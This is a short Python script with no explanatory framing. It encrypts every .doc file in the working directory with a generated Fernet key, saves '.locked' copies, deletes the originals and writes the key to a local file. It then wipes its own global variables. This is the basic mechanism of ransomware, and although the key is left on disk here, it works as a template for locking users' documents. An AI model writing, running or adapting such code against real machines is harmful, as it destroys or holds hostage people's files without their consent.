import os
import glob
from cryptography.fernet import Fernet

def lock_files(password):
    file_extensions = ["*.doc"]

    key = Fernet.generate_key()
    cipher_suite = Fernet(key)

    for ext in file_extensions:
        for doc_file in glob.glob(ext):
            try:
                with open(doc_file, "rb") as file:
                    file_data = file.read()
                
                encrypted_data = cipher_suite.encrypt(file_data)
                new_filename = doc_file + ".locked"

                with open(new_filename, "wb") as file:
                    file.write(encrypted_data)
                
                os.remove(doc_file)
                print(f"{doc_file} has been loacked and renamed to {new_filename}.")
            
            except Exception as e:
                print(f"Failed to lock {doc_file}: {e}")
        
        with open("decryption_key.key", "wb") as key_file:
            key_file.write(key)


if __name__=='__main__':
    try:
        lock_files(password="your_password")
    
    except Exception as e:
        print(f"An error occurred: {e}")
    
    finally:
        for i in list(globals().keys()):
            if i[0] != '_':
                exec('del {}'.format(i))
        del i

